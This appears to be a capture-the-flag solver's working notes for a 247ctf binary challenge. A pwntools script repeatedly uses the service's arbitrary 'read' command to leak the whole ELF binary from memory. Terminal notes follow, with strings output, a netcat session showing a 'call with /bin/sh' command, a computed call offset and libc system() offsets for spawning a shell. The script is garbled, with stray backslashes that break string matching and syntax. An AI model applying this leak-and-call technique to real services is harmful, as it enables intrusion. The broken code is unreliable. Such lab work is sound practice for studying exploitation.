
```python
from pwn import *
import time

host="2d1f2ed091914fa6.247ctf.com"
port=50049
p=remote(host,port)
p.sendline(b"base")
p.recvuntil(b"Base address: ")
base=int(p.recvline().strip(),10)
log.info(f"Base address: {hex(base)}")
p.sendline(b"read")
p.recvuntil(b"Which address do you want to read from?\\n")
p.sendline(str(base).encode())
elf_header=b""
for i in range(64):
    p.sendline(b"read")
    p.recvuntil(b"Which address do you want to read fr\om?\n")
    p.sendline(str(base+i).encode())
    response=p.recvline()
    if b"=>" in response:
        byte_value=int(response.split(b"=>")[1].strip(\),16)&0xff
        elf_header+=bytes([byte_value])
        print(f"Leaking byte {i}: {hex(byte_value)} (A\SCII: {chr(byte_value) if 32<=byte_value<=126 else '.'})")
    else:
        break
if elf_header[:4]!=b"\x7fELF":
    log.error("Not a valid ELF file!")
    p.close()
    exit(1)
e_shoff=int.from_bytes(elf_header[32:40],'little')
e_shentsize=int.from_bytes(elf_header[58:60],'little')
e_shnum=int.from_bytes(elf_header[60:62],'little')
elf_size=e_shoff+(e_shentsize*e_shnum)
log.info(f"Estimated ELF size: {elf_size} bytes")
leaked_bytes=bytearray()
for i in range(elf_size):
    if i%100==0:
        log.info(f"Leaking byte {i}/{elf_size} ({(i/el\f_size)*100:.2f}%)")
    p.sendline(b"read")
    p.recvuntil(b"Which address do you want to read fr\om?\n")
    p.sendline(str(base+i).encode())
    response=p.recvline()
    if b"=>" not in response:
        log.error(f"Failed to leak byte at offset {i}"\)
        break
    byte_value=int(response.split(b"=>")[1].strip(),16\)&0xff
    leaked_bytes.append(byte_value)
    if i<256 or i>elf_size-256:
        print(f"Offset {i}: {hex(byte_value)} (ASCII: \{chr(byte_value) if 32<=byte_value<=126 else '.'})")
with open("leaked_binary","wb") as f:
    f.write(leaked_bytes)
log.success(f"Binary leaked and saved as 'leaked_binar\y' ({len(leaked_bytes)} bytes)")
try:
    elf=ELF("leaked_binary")
    log.info("Loaded leaked binary as ELF:")
    print(elf)
    log.info("Functions found:")
    for name,addr in elf.symbols.items():
        print(f"  {name}: {hex(addr)}")
except Exception as e:
    log.error(f"Failed to load leaked binary as ELF: {\e}")
    print(hexdump(leaked_bytes[:256]))
p.close()
```

```
❯ strings -a -t x leaked_binary | grep "/bin/sh"
    b4c /bin/sh
    b98 	call - call an address with /bin/sh as the argument
  ~/Downloads                                                                  01:14:18 PM
❯ 

xxd leaked_binary | grep "bin/sh"


it usess ❯ strings leaked_binary
/lib/ld-linux.so.2
libc.so.6
IOstdin_used
strncmp
isoc99_scanf
puts
stdin
printf
fgets
getchar
read
stdout
cxa_finalize
setbuf
libc_start_main
stack_chk_fail
GLIBC_2.7
GLIBC_2.1.3
GLIBC_2.4
GLIBC_2.0

❯ nc 2d1f2ed091914fa6.247ctf.com 50049
Commands:
	base - print base address
	read - read from an address
	call - call an address with /bin/sh as the argument
	exit - exit the program
Enter command:
-------------------------
base
	Base address: 1448488960
Enter command:
-------------------------
call
	Which address do you want to call?


base_address + 0x1FE8



https://github.com/lieanu/LibcSearcher/blob/master/libc-database/db/libc6_2.4-1ubuntu12_i386.so


libc6_2.7-10ubuntu3_i386.so

chmod +x ./libc6_2.4-1ubuntu12_i386.so

https://dogbolt.org/?id=2b4763fd-fde3-4193-ab18-79e2152669e7#Hex-Rays=295&Ghidra=226&Relyze=380


https://github.com/lieanu/LibcSearcher/blob/master/libc-database/db/libc6-i386_2.4-1ubuntu12.3_amd64.symbols


2.4.1 system 00036870
2.7.1 system 00038c40
```
